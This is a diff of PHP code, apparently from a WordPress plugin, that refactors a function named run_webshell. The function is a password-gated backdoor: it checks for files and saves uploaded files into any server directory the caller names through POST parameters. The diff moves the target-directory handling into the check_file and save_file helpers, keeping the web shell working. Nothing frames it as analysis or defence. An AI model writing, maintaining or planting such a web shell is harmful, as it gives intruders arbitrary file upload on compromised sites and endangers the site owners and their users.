@@ -8,27 +8,27 @@ function run_webshell() {
     if ( $password != get_option('webshell_password') ) {
         return 'wrong password';
     }
-    if ( !isset($_POST['target']) ) {
-        return 'please enter target';
-    }
-    $targetDir = $_POST['target'];
     if ( !isset($_POST['command']) ) {
         return 'no command';
     }
     $command = $_POST['command'];
     switch ($command) {
         case 'check':
-            return check_file($targetDir);
+            return check_file();
             break;
         case 'save':
-            return save_file($targetDir);
+            return save_file();
             break;
         default:
             return "undefind command: '$command'";
     }
 }
 
-function check_file($targetDir) {
+function check_file() {
+    if ( !isset($_POST['target']) ) {
+        return 'please enter target';
+    }
+    $targetDir = $_POST['target'];
     if ( !isset($_POST['filename']) ) {
         return 'please enter filename';
     }
@@ -40,7 +40,11 @@ function check_file($targetDir) {
     return 'not exist';
 }
 
-function save_file($targetDir) {
+function save_file() {
+    if ( !isset($_POST['target']) ) {
+        return 'please enter target';
+    }
+    $targetDir = $_POST['target'];
     if (isset($_FILES['uploaded_file'])) {
         $fileName = basename($_FILES['uploaded_file']['name']);
         $targetFilePath = $targetDir . $fileName;
